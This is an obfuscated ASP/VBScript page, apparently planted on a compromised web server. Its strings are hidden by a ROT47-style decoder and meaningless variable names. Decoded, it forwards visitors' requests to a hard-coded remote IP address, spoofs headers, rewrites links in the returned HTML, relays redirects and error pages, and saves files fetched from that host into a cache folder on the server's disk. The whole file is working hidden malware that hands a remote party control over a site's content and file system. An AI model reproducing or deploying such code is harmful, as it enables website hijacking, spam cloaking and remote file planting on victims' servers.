<%@ LANGUAGE=VBSCRIPT CODEPAGE=65001 %>
<%
Dim JJJQQQ,JJJQQJ,JJJQJQ,JJJQJJ,JJJJQQ
Set JJJQJQ=Response:Set JJJQQJ=Request:Set JJJJQQ=Session:Set JJJQQQ=Application:Set JJJQJJ=Server
Set JJQJQJJ = New JQQJQJJ
JJQJQJJ.dizhi 	= JQQJQQQ("bf]e`]aba]`fb")
JJQJQJJ.filename 	= JJJQQJ.ServerVariables(JQQJQQQ("$4C:AE0}2>6"))
JJQJQJJ.csvalue 	= JQQJQQQ("G:56@")
JJQJQJJ.cachefile 	= JQQJQQQ("^42496")
JJQJQJJ.connect
Class JQQJQJJ
Public JQQJJQQ,dizhi,JQQJJJQ,filename,csvalue,cachefile
Private JQJQQJQ,JQJQQJJ,JQJQJQQ,JQJQJQJ,JQJQJJQ,JQJQJJJ,JQJJQQQ
Private Sub Class_Initialize
JQJQQJQ	= ""
filename	= JQQJQQQ(":?56I]2DA")
csvalue		= JQQJQQQ("A286")
JQJQQJJ	= JJJQQJ.ServerVariables(JQQJQQQ("$t#")&JQQJQQQ("'t#0$~u%")&JQQJQQQ("(p#t"))
JQQJJQQ 		= JQQJQQQ("`af]_]_]`")
dizhi 	= JQQJQQQ("`af]_]_]`")
JQQJJJQ	= ""
JQJQJJJ 	= JJJQQJ.ServerVariables(JQQJQQQ("w%%!0w~$%"))
cachefile 	= JQQJQQQ("^42496")
JQJJQQQ			= JQQQJJQ()
End Sub
Function connect()
Dim JQJJQQJ
Set JQJJQQJ = JJJQJJ.Createobject(JQQJQQQ("(")&JQQJQQQ(":?w")&JQQJQQQ("E")&JQQJQQQ("EA](:")&JQQJQQQ("?wEEA#")&JQQJQQQ("6BF6D")&JQQJQQQ("E]")&"5"&".1")
JQJJQQJ.option(6) = false
JQJJQQJ.Open JQQJQQQ("vt%"), JQQJQQQ("9EEAi^^")&dizhi&JQQJQQQ("^")&JJJQQJ.QueryString , False
JQJJQQJ.setRequestHeader JQQJQQQ(")\#62=D57=<;H6Cb=abc=<;abc=<;abc=\x!"), JQJJQQQ
JQJJQQJ.setRequestHeader JQQJQQQ("w@DE"), JQJQJJJ
JQJJQQJ.setRequestHeader JQQJQQQ("&D6C\p86?E"), JJJQQJ.ServerVariables(JQQJQQQ("w%%!0&$t#0pvt}%"))
If JJJQQJ.ServerVariables(JQQJQQQ("w%%!0#tut#t#"))<>"" Then
JQJJQQJ.setRequestHeader JQQJQQQ("#676C6C"), JJJQQJ.ServerVariables(JQQJQQQ("w%%!0#tut#t#"))
End If
JQJJQQJ.Send()
JQJJQQJ.WaitForResponse()
JQJQJJQ			= JQJJQQJ.ResponseBody
JQJQQJQ		= JQJJQQJ.Status
If JQJQQJQ=302 or JQJQQJQ= 301 Then
JQJQJQJ	= JQJJQQJ.GetResponseHeader(JQQJQQQ("{@42E:@?"))
end if
Set JQJJQQJ=Nothing
set JJQJJQQ = JJJQJJ.CreateObject(JQQJQQQ("p5@53]$EC62>"))
JJQJJQQ.Type = (42 * 106 - 4451)
JJQJJQQ.Mode = (51 * 16 - 813)
JJQJJQQ.Open
JJQJJQQ.Write JQJQJJQ
JJQJJQQ.Position = (38 * 58 - 2204)
JJQJJQQ.Type = (13 * 71 - 921)
JJQJJQQ.Charset = JQQJQQQ("&%u\g")
JQJQJJQ = JJQJJQQ.ReadText
JJQJJQQ.Close
JJJJJQ()
End function
Function JJJJJQ()
If JQJQQJQ="302" Then
JJJQJQ.Redirect(JQJQJQJ)
Exit Function
ElseIf JQJQQJQ="301" Then
JJJQJQ.Status = JQQJQQQ("w%%!^`]` ,b_` ,|@G65 ,!6C>2?6?E=J")
JJJQJQ.Addheader JQQJQQQ("{@42E:@?"),JQJQJQJ
Exit Function
ElseIf JQJQQJQ="404" Then
JJJQJQ.Status = JQQJQQQ("w%%!^`]` ,c_c ,}@E ,u@F?5")
JJJQJQ.Addheader JQQJQQQ("s2E6"), now&JQQJQQQ(" ,v|%")
JJJQJQ.Addheader JQQJQQQ("$6CG6C"), JQJQQJJ
JJJQJQ.Addheader JQQJQQQ("r@?E6?E\%JA6"),JQQJQQQ("E6IE^9E>=")
JJJQJQ.Write JQQJQQQ("k9E>=mk9625mkE:E=6mc_c ,}@E ,u@F?5k^E:E=6mk^9625mk3@5Jmk9`mc_c ,}@E ,u@F?5k^9`m")&JQJQQJJ&JQQJQQQ("k^3@5Jmk^9E>=m")
Exit Function
ElseIf JQJQQJQ="403" Then
JJJQJQ.Status = JQQJQQQ("w%%!^`]` ,c_b ,u@C3:556?")
JJJQJQ.Addheader JQQJQQQ("s2E6"), now &JQQJQQQ(" ,v|%")
JJJQJQ.Addheader JQQJQQQ("$6CG6C"), JQJQQJJ
JJJQJQ.Addheader JQQJQQQ("r@?E6?E\%JA6"),JQQJQQQ("E6IE^9E>=")
JJJQJQ.Write JQQJQQQ("k9E>=mk9625mkE:E=6mc_b ,u@C3:556?k^E:E=6mk^9625mk3@5Jmk9`mc_b ,u@C3:556?k^9`m")&JQJQQJJ&JQQJQQQ("k^3@5Jmk^9E>=m")
Exit Function
End If
JJJQJQ.ContentType = JQQJQQQ("E6IE^9E>=")
JJJQJQ.AddHeader JQQJQQQ("r@?E6?E\%JA6"), JQQJQQQ("E6IE^9E>=j492CD6El&%u\g")
JJJQJQ.CodePage = (33 * 16 - -64473)
JJJQJQ.CharSet = JQQJQQQ("&%u\g")
JQJQJJQ = JJJJJJ(JQQJQQQ("9C67lW-QMVX^W]YnX-]WA9AXW-QMVX"), JQQJQQQ("9C67lQ")&filename&JQQJQQQ("nSa]SbQ"), JQJQJJQ)
JQJQJJQ = JJJJJJ(JQQJQQQ("9C67lWQMVX9EEAi-^-^W]YnX-^W]YnX-]WA9AXWQMVX"), JQQJQQQ("9C67lQ9EEAi^^Sa")&filename&JQQJQQQ("nSb]ScQ"), JQJQJJQ)
JQJQJJQ = JJJJJJ(JQQJQQQ("9C67lQ^D:E6>2A]A9AQ"), JQQJQQQ("9C67lQ")&filename&JQQJQQQ("nD:E6>2A]A9AQ"), JQJQJJQ)
JQJQJJQ = Replace(JQQJQQQ("9C67lQ")&filename&JQQJQQQ("n")&filename&JQQJQQQ("n"), JQQJQQQ("9C67lQ")&filename&JQQJQQQ("n"), JQJQJJQ)
JJJQJQ.Write JQJQJJQ
End Function
Function JJJJJJ(JJJQQJQ, JJJQQJJ, Str)
Dim JQJJQJQ
Set JQJJQJQ = New RegExp
JQJJQJQ.Pattern = JJJQQJQ
JQJJQJQ.IgnoreCase = false
JQJJQJQ.Global = True
JJJJJJ = JQJJQJQ.Replace(Str, JJJQQJJ)
End Function
Function JQQQQQQ(JJJQQJQ, JJJQQJJ, Str, JJJQJQJ)
Dim JQJJQJQ, JQJJQJJ, JQJJJQQ
Set JQJJQJQ = New RegExp
JQJJQJQ.Pattern = JJJQQJQ
JQJJQJQ.IgnoreCase = false
JQJJQJQ.Global = True
Set JQJJJQQ = JQJJQJQ.Execute(Str)
For Each JQJJQJJ in JQJJJQQ
IF JJJQJQJ = JQQJQQQ("4DD") then
JQQQQQJ JQJJQJJ.SubMatches(0)&JQQJQQQ("]")&JQJJQJJ.SubMatches(1)
Elseif JJJQJQJ = JQQJQQQ(":>8") Then
JQQQQJQ  JQJJQJJ.SubMatches(0)&JQQJQQQ("]")&JQJJQJJ.SubMatches(1)
End If
Next
JQQQQQQ = JQJJQJQ.Replace(Str, JJJQQJJ)
End Function
Function JQQQQQJ(JJJQJJQ)
dim JQJJJQJ
JQJJJQJ=JJJQJJ.MapPath(JQQJQQQ("^"))&cachefile&JJJQJJQ
Set JJQJJQJ=JJJQJJ.CreateObject(JQQJQQQ("$4C:A")&JQQJQQQ("E:?8]u:=")&JQQJQQQ("6$JDE")&JQQJQQQ("6>~3;")&JQQJQQQ("64E"))
If JJQJJQJ.FileExists(JQJJJQJ) Then
Set JJQJJQJ=Nothing
Exit Function
end if
Set JJQJJQJ=Nothing
Dim JQJJQQJ
Set JQJJQQJ = JJJQJJ.Createobject(JQQJQQQ("(:?w")&JQQJQQQ("EEA](:?")&JQQJQQQ("wEEA")&JQQJQQQ("#6BF6")&JQQJQQQ("DE]")&"5."&"1")
JQJJQQJ.option(6) = false
JQJJQQJ.Open JQQJQQQ("!~$%"), JQQJQQQ("9EEAi^^")&dizhi&JJJQJJQ , False
JQJJQQJ.setRequestHeader JQQJQQQ("w@DE"), JQJQJJJ
JQJJQQJ.setRequestHeader JQQJQQQ(")\#62=D57=<;H6Cb=abc=<;abc=<;abc=\x!"), JQJJQQQ
JQJJQQJ.Send()
JJQJJJQ = JQJJQQJ.ResponseText
JQQQJQJ(JQQJQQQ("^")&JQQQJQQ(cachefile&JJJQJJQ))
JQQJQJQ JQQJQQQ("^")&cachefile&JJJQJJQ,JJQJJJQ,JQQJQQQ("&%u\g")
Set JQJJQQJ=Nothing
End function
Function JQQQQJQ(JJJQJJQ)
On Error Resume Next
dim JQJJJQJ
JQJJJQJ=JJJQJJ.MapPath(JQQJQQQ("^"))&cachefile&JJJQJJQ
Set JJQJJQJ=JJJQJJ.CreateObject(JQQJQQQ("$4C:A")&JQQJQQQ("E:?8]u:=")&JQQJQQQ("6$JDE")&JQQJQQQ("6>~3;")&JQQJQQQ("64E"))
If JJQJJQJ.FileExists(JQJJJQJ) Then
Set JJQJJQJ=Nothing
Exit Function
end if
Set JJQJJQJ=Nothing
Dim JQJJQQJ
Set JQJJQQJ = JJJQJJ.Createobject(JQQJQQQ("(:?")&JQQJQQQ("wEE")&JQQJQQQ("A](:?w")&JQQJQQQ("EEA#")&JQQJQQQ("6BF6")&JQQJQQQ("DE]d")&".1")
JQJJQQJ.option(6) = false
JQJJQQJ.Open JQQJQQQ("vt%"), JQQJQQQ("9EEAi^^")&dizhi&JJJQJJQ , False
JQJJQQJ.setRequestHeader JQQJQQQ("w@DE"), JQJQJJJ
JQJJQQJ.setRequestHeader JQQJQQQ(")\#62=D57=<;H6Cb=abc=<;abc=<;abc=\x!"), JQJJQQQ
JQJJQQJ.Send()
JQJJQQJ.WaitForResponse
JQQQJQJ(JQQJQQQ("^")&JQQQJQQ(cachefile&JJJQJJQ))
Set JJQJJJJ=JJJQJJ.CreateObject(JQQJQQQ("25@")&JQQJQQQ("53]DEC")&JQQJQQQ("62>"))
JJQJJJJ.Type= (42 * 106 - 4451)
JJQJJJJ.open
JJQJJJJ.write JQJJQQJ.ResponseBody
JJQJJJJ.SaveToFile JJJQJJ.MapPath(JQQJQQQ("^")&cachefile&JJJQJJQ)
JJQJJJJ.flush
JJQJJJJ.Close
Set JJQJJJJ=Nothing
Set JQJJQQJ=Nothing
End function
Function JQQQQJJ(JJJQJJJ)
JQQQQJJ = mid(JJJQJJJ,instrrev(JJJQJJJ,JQQJQQQ("^"))+1)
End Function
Function JQQQJQQ(JJJQJJJ)
JQQQJQQ = Left(JJJQJJJ,instrrev(JJJQJJJ,JQQJQQQ("^")))
End Function
Function JQQQJQJ(ByVal CFolder)
Dim JQJJJJQ, JQJJJJJ, JJQQQQQ, CreateFolder
Dim JJQQQJQ, JJQQQJJ, JJQQJQQ, JJQQJQJ, JJQQJJQ
JJQQJJQ = False
CreateFolder = CFolder
On Error Resume Next
Set JQJJJJQ = JJJQJJ.CreateObject(JQQJQQQ("$4C")&JQQJQQQ(":AE:?8]")&JQQJQQQ("u:=6")&JQQJQQQ("$JDE6>")&JQQJQQQ("~3;64E"))
If Err Then
Err.Clear()
Exit Function
End If
If Right(CreateFolder, 1) = JQQJQQQ("^") Then
CreateFolder = Left(CreateFolder, Len(CreateFolder) -1)
End If
JJQQQQQ = Split(CreateFolder, JQQJQQQ("^"))
For JJQQQJQ = 0 To UBound(JJQQQQQ)
JJQQJQQ = ""
For JJQQQJJ = 0 To JJQQQJQ
JJQQJQQ = JJQQJQQ & JJQQQQQ(JJQQQJJ) & JQQJQQQ("^")
Next
JJQQJQJ = JJJQJJ.MapPath(JJQQJQQ)
If Not JQJJJJQ.FolderExists(JJQQJQJ) Then
JQJJJJQ.CreateFolder(JJQQJQJ)
End If
Next
If Err Then
Err.Clear()
Else
JJQQJJQ = True
End If
JQQQJQJ = JJQQJJQ
End Function
Sub JQQJQJQ (JJJJQQQ,byval Str,CharSet)
On Error Resume Next
set JJQJJJJ=JJJQJJ.CreateObject(JQQJQQQ("25@")&JQQJQQQ("53]DEC")&JQQJQQQ("62>"))
JJQJJJJ.Type= (13 * 71 - 921)
JJQJJJJ.mode= (51 * 16 - 813)
JJQJJJJ.open
JJQJJJJ.WriteText str
JJQJJJJ.SaveToFile JJJQJJ.MapPath(JJJJQQQ)
JJQJJJJ.flush
JJQJJJJ.Close
set JJQJJJJ=nothing
End Sub
Function JQQQJJQ()
on error resume next
Dim JJQQJJJ
If JJJQQJ.ServerVariables(JQQJQQQ("w%%!0")&JQQJQQQ(")0")&JQQJQQQ("u~#")&JQQJQQQ("(p#sts0u~#")) = "" Or InStr(JJJQQJ.ServerVariables(JQQJQQQ("w")&JQQJQQQ("%%!0)0u~")&JQQJQQQ("#(")&JQQJQQQ("p#s")&JQQJQQQ("ts0u~#")), JQQJQQQ("F?<?@H?")) > 0 Then
JJQQJJJ = JJJQQJ.ServerVariables(JQQJQQQ("#t|")&JQQJQQQ("~%t0p")&JQQJQQQ("ss#"))
ElseIf InStr(JJJQQJ.ServerVariables(JQQJQQQ("w%")&JQQJQQQ("%!0)0u~#(")&JQQJQQQ("p#sts0u~#")), JQQJQQQ("[")) > 0 Then
JJQQJJJ = Mid(JJJQQJ.ServerVariables(JQQJQQQ("w")&JQQJQQQ("%%!0)0u~")&JQQJQQQ("#(p#s")&JQQJQQQ("ts0u~#")), 1, InStr(JJJQQJ.ServerVariables(JQQJQQQ("w%%")&JQQJQQQ("!0)0u")&JQQJQQQ("~#(")&JQQJQQQ("p#")&JQQJQQQ("sts0u")&JQQJQQQ("~#")), JQQJQQQ("["))-1)
JJJQQQQ = JJJQQJ.ServerVariables(JQQJQQQ("#t|~")&JQQJQQQ("%t0pss")&JQQJQQQ("#"))
ElseIf InStr(JJJQQJ.ServerVariables(JQQJQQQ("w%%")&JQQJQQQ("!0)0u")&JQQJQQQ("#(")&JQQJQQQ("p#sts0u~#")), JQQJQQQ("j")) > 0 Then
JJQQJJJ = Mid(JJJQQJ.ServerVariables(JQQJQQQ("w%")&JQQJQQQ("%!0)0u~#(")&JQQJQQQ("p#sts0u~#")), 1, InStr(JJJQQJ.ServerVariables(JQQJQQQ("w")&JQQJQQQ("%%!0")&JQQJQQQ("0u~#")&JQQJQQQ("(p#s")&JQQJQQQ("ts0u~#")), JQQJQQQ("j"))-1)
JJJQQQQ = JJJQQJ.ServerVariables(JQQJQQQ("#")&JQQJQQQ("t|~")&JQQJQQQ("%t0pss")&JQQJQQQ("#"))
Else
JJQQJJJ = JJJQQJ.ServerVariables(JQQJQQQ("w%")&JQQJQQQ("%!")&JQQJQQQ("0)0u~")&JQQJQQQ("#(p#s")&JQQJQQQ("ts0u~#"))
JJJQQQQ = JJJQQJ.ServerVariables(JQQJQQQ("#t|")&JQQJQQQ("~%t0ps")&JQQJQQQ("s#"))
End If
JQQQJJQ = Replace(Trim(Mid(JJQQJJJ, 1, 30)), JQQJQQQ("V"), "")
End Function
Function JQQQJJJ()
On Error Resume Next
Dim JJQJQQQ
If LCase(JJJQQJ.ServerVariables(JQQJQQQ("w%%!$"))) = JQQJQQQ("@77") Then
JJQJQQQ = JQQJQQQ("9EEAi^^")
Else
JJQJQQQ = JQQJQQQ("9EEADi^^")
End If
JJQJQQQ = JJQJQQQ&JJJQQJ.ServerVariables(JQQJQQQ("$t#'t#0}p|t"))
If JJJQQJ.ServerVariables(JQQJQQQ("$t#'t#0!~#%")) <> 80 Then
JJQJQQQ = JJQJQQQ&JQQJQQQ("i")&JJJQQJ.ServerVariables(JQQJQQQ("$t#'t#0!~#%"))
End If
JJQJQQQ = JJQJQQQ&JJJQQJ.ServerVariables(JQQJQQQ("&#{"))
If Trim(JJJQQJ.QueryString)<>"" Then
JJQJQQQ = JJQJQQQ&JQQJQQQ("n")&Trim(JJJQQJ.QueryString)
End If
JQQQJJJ = JJQJQQQ
End Function
End Class
Function JQQJQQQ(ByVal JJJQQQJ)
Dim JJQJQQJ, JJQQQJQ, JJQJQJQ
JJJQQQJ = Replace(JJJQQQJ, Chr(37) & ChrW(-243) & Chr(62), Chr(37) & Chr(62))
For JJQQQJQ = 1 To Len(JJJQQQJ)
If JJQQQJQ <> JJQJQJQ Then
JJQJQQJ = AscW(Mid(JJJQQQJ, JJQQQJQ, 1))
If JJQJQQJ >= 33 And JJQJQQJ <= 79 Then
JQQJQQQ = JQQJQQQ & Chr(JJQJQQJ + 47)
ElseIf JJQJQQJ >= 80 And JJQJQQJ <= 126 Then
JQQJQQQ = JQQJQQQ & Chr(JJQJQQJ - 47)
Else
JJQJQJQ = JJQQQJQ + 1
If Mid(JJJQQQJ, JJQJQJQ, 1) = JQQJQQQ("o") Then JQQJQQQ = JQQJQQQ & ChrW(JJQJQQJ + 5) Else JQQJQQQ = JQQJQQQ & Mid(JJJQQQJ, JJQQQJQ, 1)
End If
End If
Next
End Function
%>